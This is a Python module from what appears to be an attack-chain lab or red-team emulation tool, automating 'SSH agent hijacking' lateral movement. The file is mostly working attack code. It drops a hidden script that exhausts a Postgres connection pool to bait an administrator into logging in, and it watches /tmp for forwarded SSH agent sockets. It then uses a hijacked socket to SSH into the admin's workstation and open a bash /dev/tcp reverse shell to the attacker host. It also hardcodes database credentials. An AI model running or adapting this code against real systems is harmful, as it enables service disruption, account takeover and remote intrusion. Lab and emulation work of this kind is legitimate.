import re
import shlex
import socket
import threading
import time

from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# advanced_lateral_movement.py — Sysadmin Baiting & SSH Agent Hijacking
# MITRE ATT&CK:
#   T1499.004 - Endpoint Denial of Service: Application or System Exploitation (Connection Pool Exhaustion)
#   T1556.003 - Modify Authentication Process: Pluggable Authentication Modules (SSH Agent Hijacking)
#   T1021.004 - Remote Services: SSH (Pivot to Workstation)
# -----------------------------------------------------------------------------
# All phases execute FROM apache via the root reverse shell.
#
# Phase 1 — Start the Watcher: Loop checking for /tmp/ssh-*/agent.*
# Phase 2 — The Bait: Exhaust the postgres DB connection pool (100 cons).
# Phase 3 — (Simulation) Sysadmin vinzenz logs into apache via `ssh -A`.
# Phase 4 — Smash & Grab: Watcher finds the socket, sets SSH_AUTH_SOCK,
#           and pivots via SSH to vinzenz's workstation.
# Phase 5 — Catch reverse shell from Vinzenz's workstation.
# =============================================================================

KALI_HOST = "10.10.0.2"
VINZENZ_WS_IP = "10.30.0.8"
VINZENZ_USER = "vinzenz.fedora"
PORT_VINZENZ = 7777

DB_HOST = "10.30.0.6"
DB_USER = "waystar-app"
DB_PASS = "AppBooking!2026"
DB_NAME = "waystar"


def send_command(shell, command):
    """Send a command through an active shell connection."""
    shell.sendall((command + "\n").encode())
    time.sleep(0.5)


_sentinel_seq = 0


def _drain(shell):
    """Discard stale bytes left in the socket buffer from a previous command."""
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=10):
    """
    Send cmd to shell, collect output, return it.
    Drains stale socket data first, then sends the command and a uniquely-
    numbered sentinel as two separate lines.  Bash echoes the sentinel line
    AFTER the command output, so buf[:sentinel_pos] captures the real output.
    """
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.5)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev_timeout = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev_timeout)

    # Everything before the sentinel echo is the real command output.
    if sentinel in buf:
        buf = buf[:buf.index(sentinel)]

    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    buf = buf.replace("\r", "")
    return buf.strip()


def _fire_reverse_shell_via_agent(root_sliver_session, socket_path, target_user, target_ip, kali_host, kali_port):
    """
    Use the hijacked SSH agent socket to SSH into Vinzenz's workstation
    and fire a reverse shell back to Kali.
    """
    ssh_cmd = (
        f"execute -o -- sh -c 'SSH_AUTH_SOCK={socket_path} ssh "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-p 22 "
        f"{target_user}@{target_ip} "
        f"\"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1\"'"
    )
    sliver_exec(root_sliver_session, ssh_cmd)


def run(root_sliver_session, kali_host=KALI_HOST, target_ip=VINZENZ_WS_IP,
        target_user=VINZENZ_USER, target_port=PORT_VINZENZ):
    """
    Execute the advanced lateral movement scenario.
    """
    log("\n[*] Starting Advanced Lateral Movement (SSH Agent Hijacking)...")

    # ------------------------------------------------------------------
    # Phase 1 & 2: The Bait (Connection Pool Exhaustion)
    # ------------------------------------------------------------------
    log("[*] Phase 1: Exhausting DB connection pool to bait sysadmin...")
    
    # We run a Python one-liner in the background to hold 100 connections open.
    bait_cmd = (
        f"python3 -c \"import psycopg2, time; "
        f"conns = []; "
        f"print('Opening connections...'); "
        f"[(conns.append(psycopg2.connect(host='{DB_HOST}', dbname='{DB_NAME}', user='{DB_USER}', password='{DB_PASS}'))) for _ in range(100) if True] rescue None; "
        f"time.sleep(600)\" > /dev/null 2>&1 &"
    )
    # Actually, the inline try/except in a list comprehension is tricky. Let's write a quick script.
    py_script = f"""
import psycopg2
import time
conns = []
try:
    for _ in range(120):
        conns.append(psycopg2.connect(host='{DB_HOST}', dbname='{DB_NAME}', user='{DB_USER}', password='{DB_PASS}'))
except Exception as e:
    pass
time.sleep(600)
"""
    # Write script to target
    b64_script = __import__('base64').b64encode(py_script.encode()).decode()
    sliver_exec(root_sliver_session, f"execute -o -- sh -c 'echo {b64_script} | base64 -d > /tmp/.db_hang.py'")
    # Execute script in background
    sliver_exec(root_sliver_session, "execute -o -- setsid -f python3 /tmp/.db_hang.py")
    
    log("[+] DB connections maxed out. Legitimate requests will now fail with 503.")

    # ------------------------------------------------------------------
    # Phase 3: Start the Watcher & Setup Listener
    # ------------------------------------------------------------------
    log("\n[*] Phase 2: Starting Watcher for SSH Agent Sockets in /tmp...")
    
    vinzenz_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vinzenz_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    vinzenz_server.bind(("0.0.0.0", target_port))
    vinzenz_server.listen(1)
    log(f"[*] Reverse shell listener started on port {target_port}.")
    
    # In a real scenario, we would wait indefinitely. For the attack chain, 
    # we'll poll for the socket for a maximum of 60 seconds.
    # We expect the test framework or user to simulate the login concurrently.
    
    log("[*] Waiting for sysadmin to log in via 'ssh -A' (polling /tmp)...")
    socket_path = None
    deadline = time.time() + 60
    
    while time.time() < deadline:
        # Check for ssh agent sockets
        out = sliver_exec(root_sliver_session, "execute -o -- sh -c 'find /tmp -type s -name \"agent.*\" 2>/dev/null | head -n 1'")
        if out and "agent." in out:
            # Parse the actual path from sliver output
            for line in out.splitlines():
                if "/tmp/ssh-" in line and "/agent." in line:
                    socket_path = line.strip()
                    break
            if socket_path:
                break
        time.sleep(2)
        
    if not socket_path:
        log("[-] Timeout waiting for sysadmin SSH login.")
        log("    → Did you simulate the login? (e.g. ssh -A root@apache)")
        vinzenz_server.close()
        sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py") # cleanup
        return {"vinzenz_shell": None}
        
    log(f"[+] WATCHER ALERT: SSH Agent socket found at {socket_path}")

    # ------------------------------------------------------------------
    # Phase 4: Smash and Grab
    # ------------------------------------------------------------------
    log(f"[*] Phase 3: Hijacking agent and pivoting to {target_user}@{target_ip}...")
    
    t = threading.Thread(
        target=_fire_reverse_shell_via_agent,
        args=(root_sliver_session, socket_path, target_user, target_ip, kali_host, target_port),
        daemon=True,
    )
    t.start()

    vinzenz_server.settimeout(15)
    try:
        vinzenz_shell, addr = vinzenz_server.accept()
        log(f"[+] Shell received from {addr[0]} (Vinzenz's Workstation)")
    except socket.timeout:
        log("[-] Timeout — no shell received from workstation via hijacked agent.")
        vinzenz_server.close()
        sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py") # cleanup
        return {"vinzenz_shell": None}
    finally:
        vinzenz_server.close()

    # ------------------------------------------------------------------
    # Cleanup & Verify
    # ------------------------------------------------------------------
    log("[*] Cleaning up bait (admin will restart service anyway, but we are polite hackers)...")
    sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py")
    sliver_exec(root_sliver_session, "execute -o -- rm -f /tmp/.db_hang.py")

    time.sleep(1)
    send_command(vinzenz_shell, "id")
    time.sleep(1)
    response = vinzenz_shell.recv(1024).decode(errors="replace")
    
    if target_user in response:
        log("[+] Advanced Lateral Movement successful!")
        log(f"[+] {response.strip()}")
    else:
        log("[-] User not confirmed in id output")
        log(f"[?] Response: {response!r}")

    return {
        "vinzenz_shell": vinzenz_shell
    }

# Test mode — not executed when imported by main.py.
if __name__ == "__main__":
    log("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        log(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    log(f"\n[*] Result: {'success' if result['vinzenz_shell'] else 'failed'}")
